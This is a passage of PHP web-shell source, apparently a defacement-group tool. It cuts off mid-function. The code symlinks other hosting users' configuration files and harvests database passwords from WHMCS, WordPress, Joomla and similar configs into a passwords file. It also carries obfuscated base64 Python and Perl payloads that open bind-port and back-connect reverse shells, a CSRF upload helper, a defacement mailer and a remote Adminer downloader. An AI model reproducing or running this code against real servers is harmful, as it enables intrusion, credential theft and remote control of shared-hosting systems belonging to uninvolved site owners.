@symlink('/home10/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home10/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
}

//password grab

function entre2v2($text,$marqueurDebutLien,$marqueurFinLien)
{

$ar0=explode($marqueurDebutLien, $text);
$ar1=explode($marqueurFinLien, $ar0[1]);
$ar=trim($ar1[0]);
return $ar;
}

$ffile=fopen('Passwords.txt','a+');


$r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/eca_symconf/";
$re=$r;
$confi=["-Wordpress.txt", "-Joomla.txt", "-WHMCS.txt", "-Vbulletin.txt", "-Other.txt", "-Zencart.txt", "-Hostbills.txt", "-SMF.txt", "-Drupal.txt", "-OsCommerce.txt", "-MyBB.txt", "-PHPBB.txt", "-IPB.txt", "-BoxBilling.txt"];

$users=file("/etc/passwd");
foreach($users as $user)
{

$str=explode(":",$user);
$usersss=$str[0];
foreach($confi as $co)
{


$uurl=$re.$usersss.$co;
$uel=$uurl;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $uel);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
$result['EXE'] = curl_exec($ch);
curl_close($ch);
$uxl=$result['EXE'];


if($uxl && preg_match('/table_prefix/i',$uxl))
{

//Wordpress

$dbp=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($dbp))
$pass=$dbp."n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/cc_encryption_hash/i',$uxl))
{

//WHMCS

$dbp=entre2v2($uxl,"db_password = '","';");
if(!empty($dbp))
$pass=$dbp."n";
fwrite($ffile,$pass);

}


elseif($uxl && preg_match('/dbprefix/i',$uxl))
{

//Joomla

$db=entre2v2($uxl,"password = '","';");
if(!empty($db))
$pass=$db."n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/admincpdir/i',$uxl))
{

//Vbulletin

$db=entre2v2($uxl,"password'] = '","';");
if(!empty($db))
$pass=$db."n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/DB_DATABASE/i',$uxl))
{

//Other

$db=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($db))
$pass=$db."n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = ","\";");
if(!empty($db))
$pass=$db."n";
fwrite($ffile,$pass);
}


}
}
echo "<center>
<a href=\"eca_symconf/root/\">Root Server</a>
<br><a href=\"eca_symconf/Passwords.txt\">Passwords</a>
<br><a href=\"eca_symconf/\">Configurations</a></center>";
}
else
{
echo "<br><center>
<form method=\"POST\">
<textarea name=\"passwd\" class='area' rows='15' cols='60'>";
$file = '/etc/passwd';
$read = @fopen($file, 'r');
if ($read){
$body = @fread($read, @filesize($file));
echo "".htmlentities($body)."";
}
elseif(!$read)
{
$read = @show_source($file) ;
}
elseif(!$read)
{
$read = @highlight_file($file);
}
elseif(!$read)
{
for($uid=0;$uid<1000;$uid++)
{
$ara = posix_getpwuid($uid);
if (!empty($ara))
{
foreach ($ara as $key => $val) {
    print "$val:";
}
print "n";
}}}

flush();
 
echo "</textarea>
<p><input name=\"m\" size=\"80\" value=\"Start\" type=\"submit\"/></p>
</form></center>";
}
}
}
// Symlink 404
elseif($_GET['symlink_tools'] == 'sym404'){
@error_reporting(0);
@ini_set('display_errors', 0); 
echo '<center><b>Coded By <a href="#">Con7ext</a> Recode by <a href="#">HiddenCoder</a></b><br>
<form method="post"><br>File Target:<br> 
<input type="text" autocomplete="off" name="dir" value="/home/user/public_html/wp-config.php">
<br>
Save As:<br> <input type="text" autocomplete="off" name="jnck" value="ojayakan.txt"><br><input name="ojaykan" type="submit" value="Execute"></form><br>';
if($_POST['ojaykan']){
rmdir("eca_sym404");mkdir("eca_sym404", 0777);
$dir = $_POST['dir'];
$jnck = $_POST['jnck'];
system("ln -s ".$dir." eca_sym404/".$jnck);
symlink($dir,"eca_sym404/".$jnck);
$inija = fopen("eca_sym404/.htaccess", "w");
fwrite($inija,"ReadmeName ".$jnck."nOptions Indexes FollowSymLinksnDirectoryIndex eca.htmnAddType text/plain .phpnAddHandler text/plain .phpnSatisfy Any");
echo'<div class="fitur"><a href="eca_sym404/" target="_blank">Click here</a></div></center>';
}
}
// Symlink Python
elseif($_GET['symlink_tools'] == 'sympy'){
$sym_dir = mkdir('eca_sympy', 0755);
        chdir('eca_sympy');
	$file_sym = "sym.py";
	$sym_script = "nVTfb9s2EH6OAf8PLIfAduJIydqugCMJ6Fx0LbBiwbK3oigo8RRxpkiBpGcrD/vbe0dbcrN2L/WDdLz7eD++++Sf0ou7PjTWTCfTiWo76wILqoXxYP1o+v5kO6AL1ifoDNDOeWW1dWzNF+RvgmA54+at0sBWLMFzVYH3LE3Z2oEIINn9Nrrqrdb9M8Onk5quvNaa3TlLEfDsjTXwzNz3rVZmw37tO4Hu71ztnDIB653Mf/nFL9fj6WkG9vP1zQtW9uyDMlJTW+/N31AF7P+UgD353XdQKaHZbw4gPLJgcao7sWHrvgTH7jfYyeM3xSM/rdiAVM7PZ1AJ37ddP1vEQNWg+6l3OvFb7/KPn9BQAfbR+opjbdgVcsjwThL24cg10fZHF5Q1NIiEPRL31mptdzj27zi2N2+Ui/P1Mc5Kt5VbnXRNaLV5LeVffQcMEzJ0deR4J4gYN/pwtBbL2A7MnI/b5Eu+u6Qm2mTnsN95E+1KWw/zxcAGouNkcb0ZlSyyoIKGYtjKQYBZevBmFZgArshqi7ejrPJdg+mZV4+Qvyy+XearrBzwEfOi+CAkIOA7Gybon1BZiTpCwNqaV4BT4sBscIsHoQwF3ykpwazR6bKU0hfDq/zf/p7jdKLEOXgUwMDaLIVQpdTwTs6WMxdFkNsEPwZJXBHQQVJjv0JrhDe2hXR3OVvauOUaW9+jOBh2ZlfTyRkdcnpgik6LCoY7mJ2Sn5GUEtFhcTkn3LgQfsUvnqM896Qx6s8nWvlAauTpP8KlRrQg+ansAYiFoxGLRys/vMYGeCJL1ASP1Um/Y/mIGxuo0RChybHwA7KyiwSomvG025ZaVZ9JJCmnioSjghH/n/h0AtrDECV1pUOgslvSUH6DeTufH3T7tepJutQnRo/a9fU4cH3kmRik9NE3cBAHI+9Zvc0J+fF69fITnX0eQeMZJ0JI7iP47FSJZ6WVPSsfDtopkbsNigYVFSTzodeQk7SuatEq3a8qoVXp1G307UA9NGFVWi1v4/VVlN5tce7x+5E/lsKB/NEERSZY46DOj+TiH8ZBhef+3LMgHC44/4wj4vcaS4giluHn8+OOlsTh4UFrXEYOF4vI2bDG4/vy5gs=";
        $sym = fopen($file_sym, "w");
	fwrite($sym, gzinflate(base64_decode($sym_script)));
	chmod($file_sym, 0755);
        $jancok = exe("python sym.py");
	echo "<br><center><div class='fitur'><a href='eca_sympy/ecasympy/' target='_blank'>Click Here</a></div>";
}
}
// Other Tools
elseif(isset($_GET['other_tools'])){
if($_GET['other_tools'] == 'csrf'){
?>
<center><h1 style="font-size:33px;">CSRF Exploiter By <a href="#">IndoXploit</a></h1><br>
<?php
}elseif($_GET['other_tools'] == 'mailer') {
?>
<center><h1 style="font-size:33px;">Mailer Tool</h1><br>
<?php
}elseif($_GET['other_tools'] == 'adminer') {
?>
<center><h1 style="font-size:33px;">Adminer</h1><br>
<?php
}else{
?>
<center><h1 style="font-size:33px;">Other Tools</h1><br>
<?php
}
echo"
<br>
<hr width='100%' style='position:absolute;top:368px;'><div class='fitur' style='position:relative;'>
<ul>
<li>
<a href='?other_tools=csrf'>CSRF</a>
</li>
<li>
<a href='?other_tools=mailer'>Mailer</a>
</li>
<li>
<a href='?other_tools=adminer'>Adminer</a>
</li>
</ul>
</div>
</center>
<br><br>";
// CSRF Exploiter
if($_GET['other_tools'] == 'csrf'){
	echo '<html>
<center>
*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc
<br><br>
<form method="post" style="font-size:14px;">
URL:<br> <input type="text" autocomplete=\'off\' name="url" size="50" height="10" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File:<br> <input type="text" autocomplete=\'off\' name="type" size="50" height="10" placeholder="example: files[]" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="xploit" value="Lock" style="width:430px;">
</center></form>';
$url = $_POST["url"];
$pf = $_POST["type"];
$d = $_POST["xploit"];
if($d) {
	echo "<center><form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form></form>
</center></html>";
}
}
// Mailer
elseif($_GET['other_tools'] == 'mailer'){
	 if($_POST['send']) {
  $to = $_POST['to'];
  $from = $_POST['from'];
  $subject = $_POST['subject'];
  $content = sulap($_POST['content']);
  if(@mail($to,$subject,$content,"FROM:$from")) {
    die("<br><center><h2><strong><font color='lime'>Success!</font></strong> Mail sent to $to </h2></center>");
  } else {
    die("<br><center><h2><strong><font color='red'>Denied!</font></strong> Cannot send Email to $to </h2></center>");
  }
}
    echo " <form method='post'>
    <center>
<b>From:</b><br>
 <input style='width:450px;' autocomplete='off' type='text' name='from' required value='$email'><br>
 <b>To:</b><br>
<input autocomplete='off' style='width:450px;' type='text' required name='to' value='".$_SERVER['SERVER_ADMIN']."'><br>
<b>Subject:</b><br>
<input style='width:450px;' autocomplete='off' required type='text' name='subject' value='Your System is Weak'><br>
<textarea name='content' required style='width: 450px; height: 200px;'>
We are Eagle Cyber Army
We are fearless to our prey
We are unbeatable
- expect us -
</textarea><br>
<input type='submit' name='send' value='Send' style='width:450px;'></center>";
}
// Adminer
elseif($_GET['other_tools'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function buat_adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<br><br><center><div class='title'>Success create Adminer file</div><br><div class='fitur'><a href='$full/adminer.php' target='_blank'>Click Here</a></div></center>";
	} else {
		if(buat_adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<br><br><center><div class='title'>Success create Adminer file</div><br><center><div class='fitur'><a href='$full/adminer.php' target='_blank'>Click Here</a></center>";
		} else {
			echo "<br><center><div class='title'><font color='red'>Failed to create Adminer file</font></div></center>";
		}
	}
}
}
elseif(isset($_GET['network'])) {
	echo "<br><fieldset><form method='post'>
	Bind Port: <br>
	PORT: <input type='text' placeholder='port' name='port_bind' value='31337'>
	<input type='submit' name='sub_bp' value='>>'>
	</form>
	<form method='post'>
	Back Connect: <br>
	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
	PORT: <input type='text' placeholder='port' name='port_bc' value='31337'>
	<input type='submit' name='sub_bc' value='>>'>
	</form>";
	$hilih = "";
	echo'<br><div style="background:gray;margin:0px;padding:1px;text-align:left;color:white;"><pre>';
	if(!isset($_POST['port_bind']) || !isset($_POST['port_bc']) || !isset($_POST['ip_bc'])){
	$hilih = "Welcome to ECA Network Execution Tools";
	}
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRuIjsNCndoaWxlKDEpIHsNCglhY2NlcHQoQ09OTixTKTsNCglpZighKCRwaWQ9Zm9yaykpIHsNCgkJZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0KCQlvcGVuIFNURElOLCI8JkNPTk4iOw0KCQlvcGVuIFNURE9VVCwiPiZDT05OIjsNCgkJb3BlbiBTVERFUlIsIj4mQ09OTiI7DQoJCWV4ZWMgJFNIRUxMIHx8IGRpZSBwcmludCBDT05OICJDYW50IGV4ZWN1dGUgJFNIRUxMXG4iOw0KCQljbG9zZSBDT05OOw0KCQlleGl0IDA7DQoJfQ0KfQ==";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		$hilih = "".$out."
".exe("ps aux | grep bp.pl")."";
		unlink("/tmp/bp.pl");
	}
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCEgXG4iKTsNCiRwYWRkcj1zb2NrYWRkcl9pbigkQVJHVlsxXSwgJGlhZGRyKSB8fCBkaWUoIkVycm9yOiAkISBcbiIpOw0KJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsNCnNvY2tldChTT0NLRVQsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCAkcHJvdG8pIHx8IGRpZSgiRXJyb3I6ICQhIFxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkISBcbiIpOw0Kb3BlbihTVERJTiwgIj4mU09DS0VUIik7DQpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7DQpvcGVuKFNUREVSUiwgIj4mU09DS0VUIik7DQpzeXN0ZW0oJy9iaW4vc2ggLWknKTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
	if(isset($_POST['sub_bc'])) {
		$f_bc = fopen("/tmp/bc.pl", "w");
		fwrite($f_bc, base64_decode($bind_connect_p));
		fclose($f_bc);

		$ipbc = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
		sleep(1);
		$hilih = "".$out."
".exe("ps aux | grep bc.pl")."";
		unlink("/tmp/bc.pl");
	}
	echo "$hilih</pre></div><br></fieldset>";
} 
// Create New File
elseif(isset($_GET['newfile'])) {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {

			$act = "<script>window.location='?edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<center><font color=red>Permission Denied!</font></center>";
		}
	}
	echo $act;
	echo "<form method='post'>
	<center>
	Filename:<br> <input type='text' autocomplete='off' name='newfile' value='".$dir."/hiddencoder.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</center>
	</form>";
}
// Create New Dir 
elseif(isset($_GET['newdir'])) {
	if($_POST['new_save_dir']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['new_dir']);
		if(!mkdir($new_folder)) {
			$act = "<center><font color=red>Permission Denied</font></center>";
		} else {
			$act = "<script>window.location='?explorer&dir=".$dir."/".$_POST['new_dir']."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	<center>
	Folder Name:<br> <input type='text' autocomplete='off' name='new_dir' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_dir' value='Submit'>
	</center>
	</form>";
}
// Rename Dir
elseif(isset($_GET['rename_dir'])) {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?explorer&dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>Permission Denied!</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<center>
	<h1 style=\"font-size:33px;\">Rename Dir</h1>
	<input type='text' autocomplete='off' required value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='Rename'>
	</center>
	</form>";
}
// Delete Dir
elseif(isset($_GET['delete_dir'])) {
	if(is_dir($dir)) {
		if(is_writable($dir)) {
			hapusDir($dir);
			// @rmdir($dir);
			// @exe("rm -rf $dir");
			// @exe("rmdir /s /q $dir");
			$act = "<script>window.location='?explorer&dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>Could not remove ".basename($dir)."</font>";
		}
	}
	echo $act;
}
// Chmod Dir
elseif(isset($_GET['chmod']) && $_GET['type'] == "dir") {
$chomod = $_GET['dirname'];
if(isset($_POST['perm'])){
$perms = 0; 
for($i=strlen($_POST['perm'])-1;$i>=0;--$i) 
$perms += (int)$_POST['perm'][$i]*8 ** (strlen($_POST['perm']) - $i - 1); 
if(!@chmod($chomod, $perms)) 
echo '<center>Can\'t set permissions!</center><br>'; 
}
echo '<center>
<form method="POST">
Permission : <input name="perm" type="text" autocomplete="off" maxlength="4" size="4" value="'.substr(sprintf('%o', fileperms($chomod)), -4).'" />
<input type="submit" value="Save" />
</form></center>'; 
}
// Chmod File
elseif(isset($_GET['chmod']) && $_GET['type'] == "file"){
$chomod = $_GET['filename'];
if(isset($_POST['perm'])){
$perms = 0; 
for($i=strlen($_POST['perm'])-1;$i>=0;--$i) 
$perms += (int)$_POST['perm'][$i]*8 ** (strlen($_POST['perm']) - $i - 1); 
if(!@chmod($chomod, $perms)) 
echo 'Can\'t set permissions!<br>'; 
}
echo '<center><form method="POST">
Permission : <input name="perm" type="text" autocomplete="off" maxlength="4" size="4" value="'.substr(sprintf('%o', fileperms($chomod)), -4).'" />
<input type="submit" value="Save" />
</form></center>'; 
}
// Archive Dir
elseif(isset($_GET['archive_dir'])){
class zipfile
{
public $datasec = []; 
public $ctrl_dir = []; 
public $eof_ctrl_dir = "x50x4bx05x06x00x00x00x00";
public $old_offset = 0;
function add_dir($name)
{
$name = str_replace("\/", "/", $name);
$fr = "x50x4bx03x04";
$fr .= "x0ax00";
$fr .= "x00x00";
$fr .= "x00x00";
$fr .= "x00x00x00x00";
$fr .= pack("V",0);
$fr .= pack("V",0);
$fr .= pack("V",0);
$fr .= pack("v", strlen($name) ); 
$fr .= pack("v", 0 );
$fr .= $name;
$fr .= pack("V",$crc); 
$fr .= pack("V",$c_len); 
$fr .= pack("V",$unc_len);
$this -> datasec[] = $fr;
$new_offset = strlen(implode("", $this->datasec));
$cdrec = "x50x4bx01x02";
$cdrec .="x00x00"; 
$cdrec .="x0ax00"; 
$cdrec .="x00x00"; 
$cdrec .="x00x00"; 
$cdrec .="x00x00x00x00"; 
$cdrec .= pack("V",0); 
$cdrec .= pack("V",0); 
$cdrec .= pack("V",0); 
$cdrec .= pack("v", strlen($name) );
$cdrec .= pack("v", 0 );
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("v", 0 ); 
$ext = "x00x00x10x00";
$ext = "xffxffxffxff";
$cdrec .= pack("V", 16 );
$cdrec .= pack("V", $this -> old_offset );
$this -> old_offset = $new_offset;
$cdrec .= $name;
$this -> ctrl_dir[] = $cdrec;
}
function add_file($data, $name)
{
$name = str_replace("\/", "/", $name);
$fr = "x50x4bx03x04";
$fr .= "x14x00";
$fr .= "x00x00";
$fr .= "x08x00"; 
$fr .= "x00x00x00x00";
$unc_len = strlen($data);
$crc = crc32($data);
$zdata = gzcompress($data);
$zdata = substr( substr($zdata, 0, strlen($zdata) - 4), 2);
$c_len = strlen($zdata);
$fr .= pack("V",$crc);
$fr .= pack("V",$c_len);
$fr .= pack("V",$unc_len);
$fr .= pack("v", strlen($name) );
$fr .= pack("v", 0 );
$fr .= $name;
$fr .= $zdata;
$fr .= pack("V",$crc);
$fr .= pack("V",$c_len); 
$fr .= pack("V",$unc_len); 
$this -> datasec[] = $fr;
$new_offset = strlen(implode("", $this->datasec));
$cdrec = "x50x4bx01x02";
$cdrec .="x00x00";
$cdrec .="x14x00"; 
$cdrec .="x00x00";
$cdrec .="x08x00";
$cdrec .="x00x00x00x00"; 
$cdrec .= pack("V",$crc); 
$cdrec .= pack("V",$c_len); 
$cdrec .= pack("V",$unc_len); 
$cdrec .= pack("v", strlen($name) );
